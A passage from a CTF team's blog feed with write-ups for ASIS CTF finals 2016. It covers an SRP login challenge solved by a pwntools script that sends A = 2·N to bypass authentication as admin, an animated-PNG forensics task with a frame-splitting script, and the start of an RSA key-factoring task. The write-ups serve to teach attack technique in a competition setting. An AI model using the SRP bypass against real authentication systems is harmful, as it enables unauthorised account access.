class="line">    salt, sol = parse(junk)</div><div class="line">    chars = digits + ascii_uppercase + ascii_lowercase</div><div class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> range(<span class="number">4</span>, <span class="number">4</span> + <span class="number">1</span>):</div><div class="line">        <span class="keyword">for</span> comb <span class="keyword">in</span> product(chars, repeat=n):</div><div class="line">            x = <span class="string">''</span>.join(comb)</div><div class="line">            <span class="keyword">if</span> is_solution(x.rstrip() + salt.rstrip(), sol):</div><div class="line">                r.sendline(x)</div><div class="line">                <span class="keyword">return</span> r.recvuntil(<span class="string">"Send the email address and the public random positive value A seperated by \",\" as \"email, A\":"</span>)</div><div class="line">    r.sendline(<span class="string">"2ewq"</span>)</div><div class="line">    <span class="keyword">return</span> r.recvline()</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    email = <span class="string">'admin@asis-ctf.ir'</span></div><div class="line">    context(arch=<span class="string">'i386'</span>, os=<span class="string">'linux'</span>)</div><div class="line">    r = remote(<span class="string">'srpp.asis-ctf.ir'</span>, <span class="number">22778</span>)</div><div class="line">    junk = r.recvuntil(<span class="string">'Enter X:'</span>)</div><div class="line">    <span class="keyword">print</span> junk</div><div class="line">    junk = bot_system(junk)</div><div class="line">    <span class="keyword">print</span> junk</div><div class="line">    N, g, k = regex_parse(<span class="string">r"[0-9]+"</span>, junk)</div><div class="line">    A = <span class="number">2</span> * long(N)</div><div class="line">    r.sendline(<span class="string">'%s,%d'</span> % (email, A))</div><div class="line">    junk = r.recvuntil(<span class="string">"Send the session key:"</span>)</div><div class="line">    <span class="keyword">print</span> junk</div><div class="line">    salt, B = regex_parse(</div><div class="line">        <span class="string">r'(?:[A-Za-z0-9+/]&#123;4&#125;)&#123;2,&#125;(?:[A-Za-z0-9+/]&#123;2&#125;[AEIMQUYcgkosw048]=|[A-Za-z0-9+/][AQgw]==|[0-9]+)'</span>, junk)</div><div class="line">    x = Hash(salt.decode(<span class="string">'base64'</span>), email, <span class="string">'x'</span>)</div><div class="line">    u = Hash(A, B)</div><div class="line">    K_client = str(Hash(<span class="number">0</span>))</div><div class="line">    r.sendline(K_client)</div><div class="line">    junk = r.recvuntil(<span class="string">"Send a POC of session key:"</span>)</div><div class="line">    <span class="keyword">print</span> junk</div><div class="line">    M_client = Hash(Hash(long(N)) ^ Hash(long(g)), Hash(email),</div><div class="line">                    salt.decode(<span class="string">'base64'</span>), long(A), long(B), K_client)</div><div class="line">    r.sendline(str(M_client))</div><div class="line">    junk = r.recvall(timeout=<span class="number">3</span>)</div><div class="line">    <span class="keyword">print</span> junk</div><div class="line"></div><div class="line">    <span class="comment"># r.sendline(321)</span></div><div class="line">    <span class="comment"># print r.recvall(timeout=2)</span></div></pre></td></tr></table></figure>
<p>Requirements to run the code above:</p>
<p>capstone==3.0.4<br>cffi==1.8.2<br>cryptography==1.5<br>enum34==1.1.6<br>idna==2.1<br>ipaddress==1.0.17<br>Mako==1.0.4<br>MarkupSafe==0.23<br>paramiko==2.0.2<br>pluggy==0.3.1<br>psutil==4.3.1<br>pwn==1.0<br>pwntools==3.0.2<br>py==1.4.31<br>pyasn1==0.1.9<br>pycparser==2.14<br>pycrypto==2.6.1<br>pyelftools==0.24<br>Pygments==2.1.3<br>pyserial==3.1.1<br>PySocks==1.5.7<br>python-dateutil==2.5.3<br>requests==2.11.1<br>ROPGadget==5.4<br>six==1.10.0<br>tox==2.3.1<br>virtualenv==15.0.3</p>
<p>Running it:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">(env)kinyabitch@Debian ~/h/c/a/c/SRPP&gt; python srpp.py</div><div class="line">[+] Opening connection to srpp.asis-ctf.ir on port 22778: Done</div><div class="line">Bot detection: Are you ready?</div><div class="line">ASIS needs proof of work to start the SRPP challenge.</div><div class="line">SHA512(X + <span class="string">"Qdir2gMmUNfQTEWws7TiiC"</span>).hexdigest() = <span class="string">"6ab9e49f8f1666eedbfcd245641494b5..."</span>,</div><div class="line">X is an alphanumeric string and |X| = 4</div><div class="line">Enter X:</div><div class="line"> Good work, Let<span class="string">'s Go!</span></div><div class="line"><span class="string">Please login as "admin@asis-ctf.ir" and get the flag:</span></div><div class="line"><span class="string">Sever is generating the parameters ...</span></div><div class="line"><span class="string">params = (N, g, k) = (150264492626393812114930741471401106498656623083068639913262819178319899775751847281352721734537734815860211276875675213404746620022806433472801532459549667439961097968054640742518648454976403201201715934962422442028556067288440471827328146158430586959765296795581920036648128166307787893201848761850772213819L, 2, 24575437478632421856161724587288271515505936432761108412190739330057705715583L)</span></div><div class="line"><span class="string">Send the email address and the public random positive value A seperated by "," as "email, A":</span></div><div class="line"><span class="string"> </span></div><div class="line"><span class="string">(salt,  public_ephemeral) = (xqP2u8/GnuOlvvwzqQyDSCzKdub3VSlC7hqSVgViCn0=, 58941979940718432698750128575222177241044268927849539714742170613086773456642367825722147824342183209059606531876412131592206870210224884096962602048579555044090406168925997732687622279935969221985354817678067387309953487365627666658193178058756987452583249987259227031087509426824835666790488037514334092494) </span></div><div class="line"><span class="string">Send the session key:</span></div><div class="line"><span class="string"> </span></div><div class="line"><span class="string">Send a POC of session key:</span></div><div class="line"><span class="string">[+] Receiving all data: Done (66B)</span></div><div class="line"><span class="string">[*] Closed connection to srpp.asis-ctf.ir port 22778</span></div><div class="line"><span class="string"> </span></div><div class="line"><span class="string">Great, you got the flag: ASIS&#123;7bdb4b540699ef341f4a3b32469cd3f6&#125;</span></div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;br&gt;Average: 2.83&lt;br&gt;Rating Count: 12&lt;br&gt;You Rated: Not rated&lt;br&gt;Points&lt;br&gt;231&lt;br&gt;Solves&lt;br&gt;35&lt;br&gt;Category&lt;br&gt;Crypto&lt;br&gt;&lt;br&gt;Desc
    
    </summary>
    
      <category term="Crypto" scheme="https://teamrocketist.github.io/categories/Crypto/"/>
    
    
      <category term="crypto" scheme="https://teamrocketist.github.io/tags/crypto/"/>
    
      <category term="login" scheme="https://teamrocketist.github.io/tags/login/"/>
    
  </entry>
  
  <entry>
    <title>[Forensics] ASIS CTF finals 2016 - p1ng</title>
    <link href="https://teamrocketist.github.io/2016/09/14/Forensics-ASIS-CTF-finals-2016-p1ng/"/>
    <id>https://teamrocketist.github.io/2016/09/14/Forensics-ASIS-CTF-finals-2016-p1ng/</id>
    <published>2016-09-14T02:33:03.000Z</published>
    <updated>2017-08-10T02:43:59.878Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br>Average: 3.60<br>Rating Count: 5<br>You Rated: Not rated<br>Points<br>121<br>Solves<br>24<br>Category<br>Forensic<br><br>Description<br><br>    p1ng is ASIS hand-drawn PNG.<br><a href="http://asis-ctf.ir/tasks/p1ng.txz_76eca77720a65d95557a3850929abd0a8a18c636" target="_blank" rel="external">http://asis-ctf.ir/tasks/p1ng.txz_76eca77720a65d95557a3850929abd0a8a18c636</a><br></blockquote>

<p>We have a png file inspecting with binwalk we can see this strange compressed data:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">kinyabitch@Debian ~/h/c/a/f/p1ng&gt; binwalk p1ng/p1ng</div><div class="line"></div><div class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</div><div class="line">--------------------------------------------------------------------------------</div><div class="line">0             0x0             PNG image, 180 x 76, 8-bit/color RGBA, non-interlaced</div><div class="line">99            0x63            Zlib compressed data, best compression</div><div class="line">4987          0x137B          Zlib compressed data, best compression</div><div class="line">9484          0x250C          Zlib compressed data, best compression</div><div class="line">17713         0x4531          Zlib compressed data, best compression</div><div class="line">22512         0x57F0          Zlib compressed data, best compression</div><div class="line">29380         0x72C4          Zlib compressed data, best compression</div><div class="line">36947         0x9053          Zlib compressed data, best compression</div><div class="line">43723         0xAACB          Zlib compressed data, best compression</div><div class="line">51878         0xCAA6          Zlib compressed data, best compression</div><div class="line">58000         0xE290          Zlib compressed data, best compression</div><div class="line">65549         0x1000D         Zlib compressed data, best compression</div><div class="line">72231         0x11A27         Zlib compressed data, best compression</div><div class="line">79133         0x1351D         Zlib compressed data, best compression</div><div class="line">85159         0x14CA7         Zlib compressed data, best compression</div><div class="line">92012         0x1676C         Zlib compressed data, best compression</div><div class="line">98842         0x1821A         Zlib compressed data, best compression</div><div class="line">105524        0x19C34         Zlib compressed data, best compression</div><div class="line">113043        0x1B993         Zlib compressed data, best compression</div><div class="line">119801        0x1D3F9         Zlib compressed data, best compression</div><div class="line">127259        0x1F11B         Zlib compressed data, best compression</div><div class="line">134259        0x20C73         Zlib compressed data, best compression</div><div class="line">139926        0x22296         Zlib compressed data, best compression</div><div class="line">146983        0x23E27         Zlib compressed data, best compression</div></pre></td></tr></table></figure>
<p>if we inspect with a hex editor or even easier using pngsplit to split the png chunks we can find some unusual type chunks like fdAT, fcTL and acTL:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">kinyabitch@Debian ~/h/c/a/f/p1ng&gt; ls p1ng/qwe/</div><div class="line">p1ng.0000.sig   p1ng.0004.IDAT  p1ng.0008.fdAT  p1ng.0012.fdAT  p1ng.0016.fdAT  p1ng.0020.fdAT  p1ng.0024.fdAT  p1ng.0028.fdAT  p1ng.0032.fdAT  p1ng.0036.fdAT  p1ng.0040.fdAT  p1ng.0044.fdAT  p1ng.0048.fdAT</div><div class="line">p1ng.0001.IHDR  p1ng.0005.fcTL  p1ng.0009.fcTL  p1ng.0013.fcTL  p1ng.0017.fcTL  p1ng.0021.fcTL  p1ng.0025.fcTL  p1ng.0029.fcTL  p1ng.0033.fcTL  p1ng.0037.fcTL  p1ng.0041.fcTL  p1ng.0045.fcTL  p1ng.0049.IEND</div><div class="line">p1ng.0002.acTL  p1ng.0006.fdAT  p1ng.0010.fdAT  p1ng.0014.fdAT  p1ng.0018.fdAT  p1ng.0022.fdAT  p1ng.0026.fdAT  p1ng.0030.fdAT  p1ng.0034.fdAT  p1ng.0038.fdAT  p1ng.0042.fdAT  p1ng.0046.fdAT</div><div class="line">p1ng.0003.fcTL  p1ng.0007.fcTL  p1ng.0011.fcTL  p1ng.0015.fcTL  p1ng.0019.fcTL  p1ng.0023.fcTL  p1ng.0027.fcTL  p1ng.0031.fcTL  p1ng.0035.fcTL  p1ng.0039.fcTL  p1ng.0043.fcTL  p1ng.0047.fcTL</div></pre></td></tr></table></figure>
<p>After some search on google I found this links <a href="https://wiki.mozilla.org/APNG_Specification" target="_blank" rel="external">https://wiki.mozilla.org/APNG_Specification</a> and <a href="http://fileformats.wikia.com/wiki/Animated_Portable_Network_Graphics" target="_blank" rel="external">http://fileformats.wikia.com/wiki/Animated_Portable_Network_Graphics</a> , this is a APNG it’s a png but animated! So our job here is to split the animation images and then maybe we can find the flag. There is a lot of tools online to do this but for the curiosity I managed to write one in python, some images were broken I needed to do some adjustments to the IDHR header to fix it:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="keyword">import</span> os</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"><span class="keyword">import</span> struct</div><div class="line"><span class="keyword">import</span> binascii</div><div class="line"></div><div class="line">directory = <span class="string">"outp/"</span></div><div class="line">signature = <span class="string">""</span></div><div class="line">ihdr_header = <span class="string">""</span></div><div class="line">fdat_chunk = <span class="string">""</span></div><div class="line">idat_chunk = <span class="string">""</span></div><div class="line">iend_chunk = <span class="string">""</span></div><div class="line">ihdrs = []</div><div class="line"></div><div class="line">parts = []</div><div class="line"></div><div class="line">PNG_SIGN = <span class="string">b"\x89\x50\x4E\x47\x0D\x0A\x1A\x0A"</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_png</span><span class="params">(png)</span>:</span></div><div class="line">    <span class="string">"""Test if @png is valid png file by checking signature</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">    @png can be str of the filename, a file-like object, or a bytes object.</span></div><div class="line"><span class="string">    """</span></div><div class="line">    <span class="keyword">if</span> isinstance(png, str):</div><div class="line">        <span class="keyword">with</span> open(png, <span class="string">"rb"</span>) <span class="keyword">as</span> f:</div><div class="line">            png = f.read(<span class="number">8</span>)</div><div class="line"></div><div class="line">    <span class="keyword">if</span> hasattr(png, <span class="string">"read"</span>):</div><div class="line">        png = png.read(<span class="number">8</span>)</div><div class="line"></div><div class="line">    <span class="keyword">return</span> png[:<span class="number">8</span>] == PNG_SIGN</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">chunks</span><span class="params">(png)</span>:</span></div><div class="line">    <span class="string">"""Yield chunks from png.</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">    @png can be a string of filename, a file-like object, or a bytes bject.</span></div><div class="line"><span class="string">    """</span></div><div class="line">    <span class="keyword">if</span> <span class="keyword">not</span> is_png(png):</div><div class="line">        <span class="comment"># convert to png</span></div><div class="line">        <span class="keyword">if</span> isinstance(png, bytes):</div><div class="line">            <span class="keyword">with</span> io.BytesIO(png) <span class="keyword">as</span> f:</div><div class="line">                <span class="keyword">with</span> io.BytesIO() <span class="keyword">as</span> f2:</div><div class="line">                    PIL.Image.open(f).save(f2, <span class="string">"PNG"</span>, optimize=<span class="keyword">True</span>)</div><div class="line">                    png = f2.getvalue()</div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            <span class="keyword">with</span> io.BytesIO() <span class="keyword">as</span> f2:</div><div class="line">                PIL.Image.open(png).save(f2, <span class="string">"PNG"</span>, optimize=<span class="keyword">True</span>)</div><div class="line">                png = f2.getvalue()</div><div class="line"></div><div class="line">    <span class="keyword">if</span> isinstance(png, str):</div><div class="line">        <span class="comment"># file name</span></div><div class="line">        <span class="keyword">with</span> open(png, <span class="string">"rb"</span>) <span class="keyword">as</span> f:</div><div class="line">            png = f.read()</div><div class="line"></div><div class="line">    <span class="keyword">if</span> hasattr(png, <span class="string">"read"</span>):</div><div class="line">        <span class="comment"># file like</span></div><div class="line">        png = png.read()</div><div class="line"></div><div class="line">    <span class="keyword">return</span> chunks_read(png)</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_chunk</span><span class="params">(type, data)</span>:</span></div><div class="line">    <span class="string">"""Create chunk with @type and chunk data @data.</span></div><div class="line"><span class="string">    </span></div><div class="line"><span class="string">    It will calculate length and crc for you. Return bytes.</span></div><div class="line"><span class="string">    </span></div><div class="line"><span class="string">    @type is str and @data is bytes.</span></div><div class="line"><span class="string">    """</span></div><div class="line">    out = struct.pack(<span class="string">"!I"</span>, len(data))</div><div class="line">    data = type.encode(<span class="string">"latin-1"</span>) + data</div><div class="line">    a = <span class="string">'%08x'</span> % (binascii.crc32(data) % (<span class="number">1</span>&lt;&lt;<span class="number">32</span>))</div><div class="line">    out += data + a.decode(<span class="string">'hex'</span>)</div><div class="line">    <span class="keyword">return</span> out</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">chunks_read</span><span class="params">(b)</span>:</span></div><div class="line">    <span class="string">"""Parse PNG bytes into different chunks, yielding (type, data). </span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">    @type is a string of chunk type.</span></div><div class="line"><span class="string">    @data is the bytes of the chunk. Including length, type, data, and crc.</span></div><div class="line"><span class="string">    """</span></div><div class="line">    <span class="comment"># skip signature</span></div><div class="line">    i = <span class="number">8</span></div><div class="line">    <span class="comment"># yield chunks</span></div><div class="line"></div><div class="line">    <span class="keyword">while</span> i &lt; len(b):</div><div class="line">        data_len, = struct.unpack(<span class="string">"!I"</span>, b[i:i + <span class="number">4</span>])</div><div class="line">        type = b[i + <span class="number">4</span>:i + <span class="number">8</span>].decode(<span class="string">"latin-1"</span>)</div><div class="line">        <span class="keyword">yield</span> type, b[i:i + data_len + <span class="number">12</span>]</div><div class="line">        i += data_len + <span class="number">12</span></div><div class="line"><span class="comment"># 6 </span></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    i = <span class="number">0</span></div><div class="line">    t = <span class="number">0</span></div><div class="line">    frame_chunks = []</div><div class="line">    frames = []</div><div class="line">    <span class="keyword">for</span> ctype, data <span class="keyword">in</span> list(chunks(<span class="string">'p1ng/p1ng'</span>)):</div><div class="line">        <span class="keyword">if</span> ctype == <span class="string">"IHDR"</span>:</div><div class="line">            ihdr_header = data</div><div class="line">            hdr = ihdr_header</div><div class="line">        <span class="keyword">elif</span> ctype == <span class="string">"acTL"</span>: <span class="comment"># ignore Animation Control Chunk</span></div><div class="line">            <span class="keyword">continue</span>    </div><div class="line">        <span class="keyword">elif</span> ctype == <span class="string">"fcTL"</span>: <span class="comment"># https://wiki.mozilla.org/APNG_Specification#.60fcTL.60:_The_Frame_Control_Chunk</span></div><div class="line">            <span class="string">"""</span></div><div class="line"><span class="string">            """</span></div><div class="line">            c = struct.unpack(<span class="string">"!IIIIHHbb"</span>, data[<span class="number">12</span>:<span class="number">-4</span>])</div><div class="line">            width = <span class="number">180</span></div><div class="line">            height = <span class="number">76</span></div><div class="line">            <span class="keyword">if</span> i <span class="keyword">in</span> [<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">2</span>,<span class="number">9</span>]:</div><div class="line">                width = c[<span class="number">0</span>]</div><div class="line">                height = c[<span class="number">1</span>]</div><div class="line">            <span class="keyword">if</span> i <span class="keyword">in</span> [<span class="number">7</span>,<span class="number">13</span>,<span class="number">21</span>,<span class="number">22</span>]:</div><div class="line">                width -= <span class="number">1</span></div><div class="line">                <span class="comment">#height = c[1]</span></div><div class="line">            <span class="keyword">if</span> i == <span class="number">6</span>:</div><div class="line">                width -= <span class="number">2</span></div><div class="line">            <span class="keyword">print</span> c</div><div class="line">            ihdr = make_chunk(<span class="string">"IHDR"</span>, struct.pack(<span class="string">"!II"</span>, width + c[<span class="number">2</span>], height+ c[<span class="number">3</span>]) + hdr[<span class="number">16</span>:<span class="number">-4</span>])</div><div class="line">            ihdrs.append(ihdr)</div><div class="line">            <span class="comment">#i += 1</span></div><div class="line">        <span class="keyword">elif</span> ctype == <span class="string">"IDAT"</span>:</div><div class="line">            parts.append((<span class="string">"IDAT"</span>, data))</div><div class="line">            i += <span class="number">1</span></div><div class="line">        <span class="keyword">elif</span> ctype == <span class="string">"fdAT"</span>: <span class="comment"># https://wiki.mozilla.org/APNG_Specification#.60fdAT.60:_The_Frame_Data_Chunk</span></div><div class="line">            parts.append((<span class="string">"IDAT"</span>, make_chunk(<span class="string">"IDAT"</span>, data[<span class="number">12</span>:<span class="number">-4</span>])))</div><div class="line">            i += <span class="number">1</span></div><div class="line">        <span class="keyword">elif</span> ctype == <span class="string">"IEND"</span>:</div><div class="line">            iend_chunk= data</div><div class="line">            <span class="keyword">break</span></div><div class="line"></div><div class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(directory):</div><div class="line">        os.makedirs(directory)</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(parts)):</div><div class="line">        <span class="comment">#parts[i] = PNG_SIGN + parts[0] + pallets[i] + parts[i] + parts[-1]</span></div><div class="line">        f = open(directory + <span class="string">'p1ng%d.png'</span> % i, <span class="string">'w+'</span>)</div><div class="line">        <span class="keyword">if</span> i == <span class="number">0</span>:</div><div class="line">            ihdrs[i] = ihdr_header</div><div class="line">        f.write(PNG_SIGN + ihdrs[i] + parts[i][<span class="number">1</span>] + iend_chunk)</div><div class="line">        f.close()</div></pre></td></tr></table></figure>
<p>After running the script you can get 22 imgs splited into a directory, after joining them you can construct the flag:<br>ASIS{As_l0n9_4s_CTF_3x1sts_th3r3_w1ll_b3_ASIS_4nd_4s_l0n9_4s_ASIS_3x1sts_th3r3_w1ll_b3_PNG!}</p>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;br&gt;Average: 3.60&lt;br&gt;Rating Count: 5&lt;br&gt;You Rated: Not rated&lt;br&gt;Points&lt;br&gt;121&lt;br&gt;Solves&lt;br&gt;24&lt;br&gt;Category&lt;br&gt;Forensic&lt;br&gt;&lt;br&gt;Des
    
    </summary>
    
      <category term="Forensics" scheme="https://teamrocketist.github.io/categories/Forensics/"/>
    
    
      <category term="forensics" scheme="https://teamrocketist.github.io/tags/forensics/"/>
    
      <category term="png" scheme="https://teamrocketist.github.io/tags/png/"/>
    
  </entry>
  
  <entry>
    <title>ASIS CTF finals - RSA</title>
    <link href="https://teamrocketist.github.io/2016/09/11/ASIS-CTF-finals-RSA/"/>
    <id>https://teamrocketist.github.io/2016/09/11/ASIS-CTF-finals-RSA/</id>
    <published>2016-09-11T17:23:20.000Z</published>
    <updated>2017-08-10T02:37:59.387Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br>Average: 4.18<br>Rating Count: 22<br>You Rated: Not rated<br>Points<br>113<br>Solves<br>64<br>Category<br>Crypto<br>Description<br><br>Find the flag.<br><a href="http://asis-ctf.ir/tasks/rsa.txz_93b525e771c284b7a3f0bb45b290ce56987c5834" target="_blank" rel="external">http://asis-ctf.ir/tasks/rsa.txz_93b525e771c284b7a3f0bb45b290ce56987c5834</a><br></blockquote>

<p>After extracting analysing the server.py file</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="comment">#!/usr/bin/python</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> gmpy</div><div class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</div><div class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</div><div class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> PKCS1_v1_5</div><div class="line"></div><div class="line">flag = open(<span class="string">'flag'</span>, <span class="string">'r'</span>).read() * <span class="number">30</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">ext_rsa_encrypt</span><span class="params">(p, q, e, msg)</span>:</span></div><div class="line">    m = bytes_to_long(msg)</div><div class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">        n = p * q</div><div class="line">        <span class="keyword">try</span>:</div><div class="line">            phi = (p - <span class="number">1</span>)*(q - <span class="number">1</span>)</div><div class="line">            d = gmpy.invert(e, phi)</div><div class="line">            pubkey = RSA.construct((long(n), long(e)))</div><div class="line">            key = PKCS1_v1_5.new(pubkey)</div><div class="line">            enc = key.encrypt(msg).encode(<span class="string">'base64'</span>)</div><div class="line">            <span class="keyword">return</span> enc</div><div class="line">        <span class="keyword">except</span>:</div><div class="line">            p = gmpy.next_prime(p**<span class="number">2</span> + q**<span class="number">2</span>)</div><div class="line">            q = gmpy.next_prime(<span class="number">2</span>*p*q)</div><div class="line">            e = gmpy.next_prime(e**<span class="number">2</span>)</div><div class="line"></div><div class="line">p = getPrime(<span class="number">128</span>)</div><div class="line">q = getPrime(<span class="number">128</span>)</div><div class="line">n = p*q</div><div class="line">e = getPrime(<span class="number">64</span>)</div><div class="line">pubkey = RSA.construct((long(n), long(e)))</div><div class="line">f = open(<span class="string">'pubkey.pem'</span>, <span class="string">'w'</span>)</div><div class="line">f.write(pubkey.exportKey())</div><div class="line">g = open(<span class="string">'flag.enc'</span>, <span class="string">'w'</span>)</div><div class="line">g.write(ext_rsa_encrypt(p, q, e, flag))</div></pre></td></tr></table></figure>
<p>Looks like a simple RSA encryption there are some strange things hapening here like the While True look with a try catch and “open(‘flag’, ‘r’).read() * 30”, we will see why this happens later right now we need to get our modulus N and e from the pubkey.pem file:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">(.env)kinyabitch@Debian ~/h/c/a/c/r/RSA&gt; openssl rsa -<span class="keyword">in</span> pubkey.pem -pubin -text -modulus</div><div class="line">Public-Key: (256 bit)</div><div class="line">Modulus:</div><div class="line">    00:d8:e2:4c:12:b7:b9:9e:fe:0a:9b:c0:4a:6a:3d:</div><div class="line">    f5:8a:2a:94:42:69:b4:92:b7:37:6d:f1:29:02:3f:</div><div class="line">    20:61:b9</div><div class="line">Exponent: 12405943493775545863 (0xac2ac3e0ca0f5607)</div><div class="line">Modulus=D8E24C12B7B99EFE0A9BC04A6A3DF58A2A944269B492B7376DF129023F2061B9</div><div class="line">writing RSA key</div><div class="line">-----BEGIN PUBLIC KEY-----</div><div class="line">MEIwDQYJKoZIhvcNAQEBBQADMQAwLgIhANjiTBK3uZ7+CpvASmo99YoqlEJptJK3</div><div class="line">N23xKQI/IGG5AgkArCrD4MoPVgc=</div><div class="line">-----END PUBLIC KEY-----</div></pre></td></tr></table></figure>
<p>Now that we have the modulus and the Exponent we will try to factor modulus N with yafu (<a href="https://github.com/DarkenCode/yafu" target="_blank" rel="external">https://github.com/DarkenCode/yafu</a>):</p>
